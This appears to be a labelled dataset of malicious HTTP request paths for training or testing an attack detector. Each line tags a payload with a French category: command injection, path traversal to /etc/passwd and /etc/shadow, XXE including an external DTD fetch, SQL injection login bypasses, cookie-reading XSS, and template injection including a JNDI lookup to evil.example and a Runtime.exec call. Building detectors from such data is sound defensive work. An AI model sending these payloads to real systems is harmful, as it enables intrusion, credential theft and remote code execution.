+COMMANDE	/inscription/etudiant?page=%252527%257C%2520%255B%25205%2520-ne%2520%2524%2528echo%2520LVDDNF%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%252527
+TRAVERSEE	/documents//etc/hostname.iprb2
+XSS	/boutique/produit?filtre=<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
+XSS	/bibliotheque/ouvrage?tri=%3Cobject%20data%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2B%3E%3C%2Fobject%3E%3F
+COMMANDE	/notes/releve?id=%27%26echo$IFSKBFTYY$((46%2B12))$(echo$IFSKBFTYY)KBFTYY%7C
+TRAVERSEE	/intranet/dossier?nom=%2Fetc%2Fhttpd%2Flogs%2Facces.log
+TRAVERSEE	/recherche?filtre=%2Fvar%2Fadm%2Flastlog%2Fusername&page=18
+XXE	/article?id=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fshadow%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E
+SQLI	/boutique/produit?filtre=admin%27%29%20or%20%271%27%3D%271&page=4
+MODELE	/produits?page=%7B%7Bconfig.items%28%29%7D%7D&page=5
+TRAVERSEE	/notes/releve?nom=/var/adm/SYSLOG
+COMMANDE	/api/v1/equipements?annee=%2527%7C%20%5B%206%20-ne%20%24%28echo%20JVVWQM%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522
+XSS	/inscription/etudiant?annee=' onmouseover=alert(/XSS/)
+SQLI	/index.php?recherche=or%201%3D1
+COMMANDE	/boutique/produit?tri=%2522%3B%20str%3D%24%28echo%20USUNJP%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C
+MODELE	/boutique/produit?page=%23%7Bsession%7D&page=3
+XXE	/intranet/dossier?id=%3C%21DOCTYPE%20xxe%20%5B%20%3C%21ENTITY%20%25%20file%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fboot.ini%22%3E%3C%21ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fexample.com%2Fevil.dtd%22%3E%25dtd%3B%25trick%3B%5D%3E
+TRAVERSEE	/fichiers//var/run/mysqld/mysqld.pid
+COMMANDE	/boutique/produit?q="%20echo%20WFBQGI$((90%2B90))$(echo%20WFBQGI)WFBQGI"&page=4
+XSS	/api/v1/equipements?filtre=<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
+TRAVERSEE	/documents/../logs/access.log
+COMMANDE	/article?ref=%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20JICOQS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20&page=14
+XXE	/boutique/produit?ref=<xml SRC="xsstest.xml" ID=I></xml>
+SQLI	/intranet/dossier?recherche=admin" or "1"="1"--
+COMMANDE	/produits?q=%22;echo$IFSPNIBTX$((67%2B98))$(echo$IFSPNIBTX)PNIBTX%2F%2F&page=4
+XSS	/bibliotheque/ouvrage?nom=<var onmouseover="prompt(1)">On Mouse Over</var>?&page=10
+MODELE	/index.php?q=%24%7Bdonotexists%7C42%2A42%7D&page=12
+COMMANDE	/intranet/dossier?nom=%3Becho%20TJXONB$((49%2B24))$(echo%20TJXONB)TJXONB|
+COMMANDE	/recherche?code=&&echo$IFSHHBLVW$((31%2B45))$(echo$IFSHHBLVW)HHBLVW"&page=8
+XSS	/intranet/dossier?annee=%3Csvg%20contentScriptType%3Dtext%2Fvbs%3E%3Cscript%3EMsgBox%2B1
+SQLI	/produits?id=or%201%3D1%2F%2A
+TRAVERSEE	/notes/releve?nom=....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd&page=18
+SQLI	/boutique/produit?tri=' UNION SELECT username,password FROM utilisateurs--
+TRAVERSEE	/boutique/produit?tri=..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fhttpd%2Faccess_log
+TRAVERSEE	/produits?filtre=%2Flogs%2Fpure-ftpd.log
+SQLI	/intranet/dossier?id=admin%22%29%20or%20%221%22%3D%221
+MODELE	/actualites?ref=%7B%7B42%2A42%7D%7D
+COMMANDE	/notes/releve?page=%3B%20str%3D%24%28echo%20OHOHHT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C&page=18
+COMMANDE	/api/v1/equipements?recherche=%2527%26echo%24IFSGDHEQM%24%28%2875%252B6%29%29%24%28echo%24IFSGDHEQM%29GDHEQM
+COMMANDE	/article?q=%0A%20str%3D%24%28echo%20FWGGRQ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522
+SQLI	/espace/connexion?utilisateur=admin%22%29%20or%20%221%22%3D%221&motdepasse=xxxxxx
+TRAVERSEE	/telechargement/..2f..2f..2f..2f..2f..2fetc2fpasswd%2500
+TRAVERSEE	/recherche?filtre=../../../../../../etc/passwd&page=20
+SQLI	/admin/login?utilisateur=admin%27%20or%201%3D1%23&motdepasse=xxxxx
+COMMANDE	/inscription/etudiant?code=%2526%2526echo%24IFSITMNHS%24%28%2843%252B23%29%29%24%28echo%24IFSITMNHS%29ITMNHS%2526
+SQLI	/catalogue?filtre=admin%22%29%20or%20%28%221%22%3D%221%22%23&page=7
+COMMANDE	/boutique/produit?page=%2527echo%24IFSXLGSCN%24%28%2877%252B2%29%29%24%28echo%24IFSXLGSCN%29XLGSCN%2526
+SQLI	/recherche?tri=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--&page=18
+COMMANDE	/catalogue?code=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520JSQHHO%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25202%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%257C
+SQLI	/intranet/dossier?annee=1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+SQLI	/inscription/etudiant?page=admin') or '1'='1'#
+COMMANDE	/catalogue?annee=%27%7Cecho%2520CTNHMN%24%28%2874%252B58%29%29%24%28echo%2520CTNHMN%29CTNHMN&page=9
+COMMANDE	/bibliotheque/ouvrage?page=%22%2526echo%2520HCCVWB%24%28%2830%252B94%29%29%24%28echo%2520HCCVWB%29HCCVWB%22
+SQLI	/api/v1/equipements?code=' or ''*'
+TRAVERSEE	/boutique/produit?page=/etc/hostname.elx2&page=2
+COMMANDE	/intranet/dossier?filtre=%7Cecho%2520EEPGGY%24%28%2839%252B86%29%29%24%28echo%2520EEPGGY%29EEPGGY%2527
+TRAVERSEE	/notes/releve?code=/etc/hostname.dmfe2
+TRAVERSEE	/index.php?filtre=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+XSS	/inscription/etudiant?filtre=%3Cscript%3Evar%20x%20%3D%20document.createElement%28%27iframe%27%29%3Bdocument.body.appendChild%28x%29%3Bvar%20xhr%20%3D%20x.contentWindow.XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%20%27http%3A%2F%2Fxssme.html5sec.org%2Fxssme2%27%2C%20true%29%3Bxhr.onload%20%3D%20function%28%29%20%7B%20alert%28xhr.responseText.match%28%2Fcookie%20%3D%20%27%28.%2A%3F%29%27%2F%29%5B1%5D%29%20%7D%3Bxhr.send%28%29%3B%3C%2Fscript%3E
+XSS	/boutique/produit?annee=%3C%25%3C%21--%27%25%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%20--%3E
+TRAVERSEE	/passwd
+TRAVERSEE	/static/../install.php
+SQLI	/api/v1/equipements?tri=admin' or 1=1&page=11
+MODELE	/catalogue?nom=%5B%5B%24%7B42%2A42%7D%5D%5D
+XXE	/boutique/produit?annee=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+SQLI	/api/v1/equipements?nom=admin%27%20or%201%3D1--&page=6
+COMMANDE	/bibliotheque/ouvrage?annee=%253B%2520str%253D%2524%2528echo%2520DRVINS%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25206%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%252526
+TRAVERSEE	/boutique/produit?q=..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess_log
+TRAVERSEE	/static//../../../../../../../../../../../etc/passwd%00.jpg
+TRAVERSEE	/index.php?annee=%2Fetc%2Fhttpd%2Fhttpd.conf&page=4
+COMMANDE	/index.php?recherche=%27%7C%7Cecho$IFSBJRIVZ$((1%2B4))$(echo$IFSBJRIVZ)BJRIVZ
+SQLI	/api/v1/equipements?q=admin%22%29%20or%20%28%221%22%3D%221%22%23
+TRAVERSEE	/static//etc/logrotate.d/httpd
+SQLI	/admin/login?utilisateur=%27%20or%20%27x%27%3D%27x&motdepasse=xxxx
+XSS	/intranet/dossier?filtre=%3Ciframe%20%20src%3D%22data%3Atext%2Fhtml%2C%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%22%3E%3C%2Fiframe%3E
+TRAVERSEE	/static//apache2/logs/error.log
+TRAVERSEE	/article?nom=config.asp
+SQLI	/article?tri=%27%20AND%20SLEEP%285%29--
+SQLI	/admin/login?utilisateur=%27%5E%27&motdepasse=xxxxxxxx
+TRAVERSEE	/static//php5\php.ini
+TRAVERSEE	/intranet/dossier?nom=%5C%5C%26apos%3B%2Fbin%2Fcat%2520%2Fetc%2Fshadow%5C%5C%26apos%3B
+TRAVERSEE	/documents/../config.asp
+TRAVERSEE	/telechargement/../../../../../var/log/apache/access_log
+TRAVERSEE	/notes/releve?tri=../../../../../../../../windows/win.ini
+TRAVERSEE	//../../../../../../../../bin/id%7C
+TRAVERSEE	/fichiers/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror.log
+SQLI	/login?utilisateur=1%27&motdepasse=xxxxxxx
+TRAVERSEE	/../../../../../../../../../../etc/passwd%00
+TRAVERSEE	/actualites?q=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+TRAVERSEE	/inscription/etudiant?q=%2Fvar%2Flog%2Fwtmp&page=2
+COMMANDE	/inscription/etudiant?annee=;cat /etc/passwd
+COMMANDE	/intranet/dossier?page=%7C%7Cecho%2520THDZZM%24%28%2855%252B49%29%29%24%28echo%2520THDZZM%29THDZZM%22&page=12
+SQLI	/espace/connexion?utilisateur=%27-%27&motdepasse=xxxxx
+COMMANDE	/notes/releve?nom=%2522%26echo%2520ZYOSSF%24%28%283%252B73%29%29%24%28echo%2520ZYOSSF%29ZYOSSF%5C
+TRAVERSEE	/catalogue?tri=%2Fusr%2Flocal%2Fwww%2Flogs%2Fthttpd_log
+COMMANDE	/actualites?filtre=%0A%20str%3D%24%28echo%20JMUDMJ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%22&page=5
+COMMANDE	/actualites?nom=%2522%3Becho%24IFSHZZDKE%24%28%2823%252B65%29%29%24%28echo%24IFSHZZDKE%29HZZDKE%26
+TRAVERSEE	/\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+SQLI	/bibliotheque/ouvrage?ref=admin%22%29%20or%20%28%221%22%3D%221%22%2F%2A
+SQLI	/notes/releve?ref=' or ''*'
+COMMANDE	/article?nom=%252522%253B%2520str%253D%2524%2528echo%2520IOBNNP%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25201%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2527&page=18
+TRAVERSEE	/telechargement//etc/hostname.spwr1
+SQLI	/bibliotheque/ouvrage?id=admin'/*
+TRAVERSEE	/boutique/produit?id=/var/log/kern.log
+COMMANDE	/intranet/dossier?q=%252527%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520HBIFJL%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25203%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2526
+SQLI	/inscription/etudiant?page=admin%27%29%20or%20%28%271%27%3D%271%27--
+SQLI	/inscription/etudiant?ref=1 or 1=1&page=16
+TRAVERSEE	/bibliotheque/ouvrage?annee=../../../../../../../usr/local/apache/logs/access_ log
+COMMANDE	/actualites?page=')print(`echo%20MAOJQM\necho%20$((57%2B39))\necho%20MAOJQM\necho%20MAOJQM`)%3B%25252523MAOJQM
+SQLI	/connexion?utilisateur=1%20OR%20%271%27%3D%271&motdepasse=xxxx
+TRAVERSEE	/fichiers//var/log/exim/rejectlog
+TRAVERSEE	/recherche?ref=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+COMMANDE	/article?nom=%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20BJMMJX%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%5C%5C&page=8
+SQLI	/actualites?filtre=%5B1%5D
+MODELE	/boutique/produit?filtre=%5B%5B%24%7B42%2A42%7D%5D%5D
+XSS	/inscription/etudiant?annee=<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
+SQLI	/login?utilisateur=%27%29%20or%20%28%27x%27%29%3D%28%27x&motdepasse=xxxxxxx
+COMMANDE	/notes/releve?ref=%257C%2520%255B%25203%2520-ne%2520%2524%2528echo%2520NDHYKC%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%257C
+TRAVERSEE	/static//var/saf/_log
+TRAVERSEE	/fichiers//var/adm/X0msgs
+TRAVERSEE	/static//var/log/maillog
+TRAVERSEE	/inscription/etudiant?id=/var/log/mysqld.log&page=3
+XSS	/api/v1/equipements?filtre=Garethy%20Salty%20Method%21%3Cscript%3Ealert%28Components.lookupMethod%28Components.lookupMethod%28Components.lookupMethod%28Components.lookupMethod%28this%2C%27window%27%29%28%29%2C%27document%27%29%28%29%2C%20%27getElementsByTagName%27%29%28%27html%27%29%5B0%5D%2C%27innerHTML%27%29%28%29.match%28%2Fd.%2A%27%2F%29%29%3B%3C%2Fscript%3E
+SQLI	/espace/connexion?utilisateur=%2527%2520OR%2520%25271%2527%253D%25271&motdepasse=xxxxxxxxx
+SQLI	/article?code=1%60&page=11
+COMMANDE	/notes/releve?filtre=%252527%253B%2520str%253D%2524%2528echo%2520BVJEPJ%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25206%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2523
+COMMANDE	/produits?nom=%0A%20str%3D%24%28echo%20IKKWEG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23
+MODELE	/recherche?filtre=${42*42}
+TRAVERSEE	//etc/security/group
+MODELE	/index.php?q=%7B%7Bconfig.items%28%29%7D%7D
+TRAVERSEE	/documents/%5Cweb.config
+SQLI	/actualites?code=admin' or '1'='1'--
+XSS	/intranet/dossier?q=%3Cdiv%20%20style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22%20%20onmouseover%3D%22prompt%281%29%22%20onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E%3F
+TRAVERSEE	/catalogue?ref=%2Fvar%2Flog%2Fftplog&page=7
+MODELE	/recherche?code=${jndi:ldap://evil.example/a}
+SQLI	/espace/connexion?utilisateur=SELECT%201%2C2%2CIF%28SUBSTR%28%40%40version%2C1%2C1%29%3C5%2CBENCHMARK%282000000%2CSHA1%280xDE7EC71F1%29%29%2CSLEEP%281%29%29%2F%2A%27XOR%28IF%28SUBSTR%28%40%40version%2C1%2C1%29%3C5%2CBENCHMARK%282000000%2CSHA1%280xDE7EC71F1%29%29%2CSLEEP%281%29%29%29OR%27%7C%22XOR%28IF%28SUBSTR%28%40%40version%2C1%2C1%29%3C5%2CBENCHMARK%282000000%2CSHA1%280xDE7EC71F1%29%29%2C%E2%80%8BSLEEP%281%29%29%29OR%22%2A%2F%20FROM%20some_table%20WHERE%20ex%20%3D%20ample&motdepasse=xxxxxxx
+MODELE	/actualites?annee=<%= 7*7 %>
+TRAVERSEE	/actualites?ref=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%2500.jpg
+TRAVERSEE	/static/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%2500
+COMMANDE	/article?recherche=%22%7C%20%5B%208%20-ne%20%24%28echo%20AYUZTB%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F&page=8
+XSS	/article?annee=%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3B%3E
+TRAVERSEE	/boutique/produit?tri=/etc/httpd/php.ini
+TRAVERSEE	/bibliotheque/ouvrage?code=%2Fetc%2Fphp.d%2Fpdo_pgsql.ini&page=20
+TRAVERSEE	/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+COMMANDE	/notes/releve?q=%3Becho$IFSGCRBKK$((37%2B88))$(echo$IFSGCRBKK)GCRBKK\
+XSS	/boutique/produit?filtre=<body/onload=&lt;!--&gt;&#10alert(1)>
+XSS	/actualites?page=%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29%20worksinIE%3E
+XSS	/bibliotheque/ouvrage?filtre=%3Cinput%20type%3D%22text%22%20value%3D%60%60%3Cdiv%2Fonmouseover%3D%27alert%281%29%27%3EX%3C%2Fdiv%3E
+SQLI	/inscription/etudiant?ref=")) or (("x"))=(("x&page=15
+TRAVERSEE	/boutique/produit?q=%2F%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2500
+COMMANDE	/catalogue?code=%7C%20%5B%201%20-ne%20%24%28echo%20QPUCUQ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527
+SQLI	/intranet/dossier?id=%27%5E%27&page=17
+TRAVERSEE	/boutique/produit?code=..2f..2fetc2fpasswd%00
+COMMANDE	/recherche?nom=%2522%257C%2520%255B%25206%2520-ne%2520%2524%2528echo%2520AYUZTB%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%25252F%25252F&page=3
+SQLI	/index.php?annee=%22%20or%20true--&page=7
+COMMANDE	/api/v1/equipements?filtre=%24%7Bpopen%28print%28%60echo%2520YYAFET%60.%60echo%2520%24%28%2862%252B68%29%29%60.%60echo%2520YYAFET%60.%60echo%2520YYAFET%60%29%253B%255C%255CYYAFET
+XSS	/catalogue?code=%3Cscript%3Efunction%20x%28window%29%20%7B%20eval%28location.hash.substr%281%29%29%20%7D%3C%2Fscript%3E%3Ciframe%20id%3Diframe%20src%3D%2522javascript%3Aparent.x%28window%29%2522%3E%3Ciframe%3E%23var%20xhr%20%3D%20new%20window.XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%20%27http%3A%2F%2Fxssme.html5sec.org%2Fxssme2%27%2C%20true%29%3Bxhr.onload%20%3D%20function%28%29%20%7B%20alert%28xhr.responseText.match%28%2Fcookie%20%3D%20%27%28.%2A%3F%29%27%2F%29%5B1%5D%29%20%7D%3Bxhr.send%28%29%3B
+TRAVERSEE	/api/v1/equipements?ref=/etc/hostname.dcelx0
+SQLI	/article?code=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+MODELE	/notes/releve?recherche=42*42&page=11
+TRAVERSEE	/recherche?annee=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Flogs%2Ferror.log
+TRAVERSEE	/static//.cshrc
+TRAVERSEE	/telechargement//etc/hostname.lo
+TRAVERSEE	/etc/shadow%2500
+SQLI	/intranet/dossier?page=") or true--&page=2
+TRAVERSEE	/actualites?code=/etc/hostname.eri3&page=5
+COMMANDE	/catalogue?code=%2527%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520WSMVBW%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25208%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%257C&page=19
+COMMANDE	/actualites?q=%252527%250A%2520str%253D%2524%2528echo%2520GBKLLU%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25204%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%25257C
+TRAVERSEE	/notes/releve?recherche=%2Fvar%2Fapache%2Flogs&page=10
+XXE	/bibliotheque/ouvrage?recherche=<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
+TRAVERSEE	/telechargement//var/lock/samba
+SQLI	/boutique/produit?nom=1\&page=12
+COMMANDE	/api/v1/equipements?filtre=%257C%257Cecho%24IFSMXRPLY%24%28%2863%252B48%29%29%24%28echo%24IFSMXRPLY%29MXRPLY%22
+COMMANDE	/actualites?tri=%253B%2520str%253D%2524%2528echo%2520RPPEVG%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25207%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%252522
+TRAVERSEE	/documents/../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00
+MODELE	/api/v1/equipements?recherche=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D&page=14
+TRAVERSEE	/static//usr/local/etc/httpd/conf/httpd.conf
+SQLI	/connexion?utilisateur=%22%20or%20%22%22%5E%22&motdepasse=xxxxxxx
+TRAVERSEE	/telechargement/../../../../../../../../../../../../../../../etc/passwd%00
+COMMANDE	/notes/releve?nom=%2527%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520AGKSYR%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25203%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%25255C%25255C
+TRAVERSEE	/../.pass
+COMMANDE	/bibliotheque/ouvrage?annee=${passthru(print(`echo%20KXVPHA%0aecho%20$((20%2B43))%0aecho%20KXVPHA%0aecho%20KXVPHA`)%3B%25255C%25255CKXVPHA
+TRAVERSEE	/boutique/produit?ref=/home\bin\stable\apache\php.ini
+XSS	/article?nom=%3Cscript%3E%20var%2Bx%2B%3D%2BshowModelessDialog%2B%28this%29%3B%20alert%28x.document.cookie%29%3B%20%3C%2Fscript%3E
+SQLI	/api/v1/equipements?filtre=1%20AND%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29a%29&page=20
+COMMANDE	/produits?filtre=%2527%3B%20str%3D%24%28echo%20QUKUCG%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22
+SQLI	/produits?code=" or ""&"
+COMMANDE	/notes/releve?filtre=%252527%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520HPIBFR%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25203%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2527
+SQLI	/intranet/dossier?ref=admin%22%20or%201%3D1&page=13
+TRAVERSEE	/documents/Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+SQLI	/connexion?utilisateur=or%201%3D1--&motdepasse=xxxxxxxx
+SQLI	/connexion?utilisateur=admin%27%29%20or%20%271%27%3D%271%27%2F%2A&motdepasse=xxxxxxxxx
+MODELE	/inscription/etudiant?nom={{{42*42}}}
+XSS	/recherche?page=%3Ciframe%20src%3D%2522404%2522%20onload%3D%2522frames%5B0%5D.document.write%28%2526quot%3B%3Cscript%3Er%3Dnew%20XMLHttpRequest%28%29%3Br.open%28%27GET%27%2C%27http%3A%2F%2Fxssme.html5sec.org%2Fxssme2%27%2Cfalse%29%3Br.send%28null%29%3Bif%28r.status%3D%3D200%29%7Balert%28r.responseText.substr%28150%2C41%29%29%3B%7D%3C%5C%2Fscript%3E%2526quot%3B%29%2522%3E%3C%2Fiframe%3E&page=7
+TRAVERSEE	/telechargement//apache/logs/error.log
+SQLI	/espace/connexion?utilisateur=admin%27%20or%20%271%27%3D%271%27--&motdepasse=xxxx
+MODELE	/article?id={^xyzm42}1764{/xyzm42}
+TRAVERSEE	/static/../../../../../var/log/httpd/error_log
+SQLI	/login?utilisateur=admin%22%20or%201%3D1%2F%2A&motdepasse=xxxx
+COMMANDE	/inscription/etudiant?annee=%3Becho%2520TFWHBO%24%28%2848%252B78%29%29%24%28echo%2520TFWHBO%29TFWHBO%257C
+XXE	/bibliotheque/ouvrage?annee=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>
+TRAVERSEE	/intranet/dossier?tri=..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror_log
+COMMANDE	/index.php?filtre=%22%29%3B%7Dprint%28%60echo%2520KHRTRY%60.%60echo%2520%24%28%2868%252B68%29%29%60.%60echo%2520KHRTRY%60.%60echo%2520KHRTRY%60%29%253B%2F%2FKHRTRY
+TRAVERSEE	/actualites?recherche=%2Fetc%2Fphp.d%2Fxmlwriter.ini
+XSS	/boutique/produit?recherche=%3Ca%20%20href%3D%22data%3Atext%2Fhtml%3Bblabla%2C%26%2360%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2332%26%23115%26%23114%26%2399%26%2361%26%2334%26%23104%26%23116%26%23116%26%23112%26%2358%26%2347%26%2347%26%23115%26%23116%26%23101%26%23114%26%23110%26%23101%26%23102%26%2397%26%23109%26%23105%26%23108%26%23121%26%2346%26%23110%26%23101%26%23116%26%2347%26%23102%26%23111%26%23111%26%2346%26%23106%26%23115%26%2334%26%2362%26%2360%26%2347%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%26%238203%22%3EClick%20%20Me%3C%2Fa%3E&page=19
+SQLI	/connexion?utilisateur=admin%22%29%20or%20%221%22%3D%221%22%23&motdepasse=xxxx
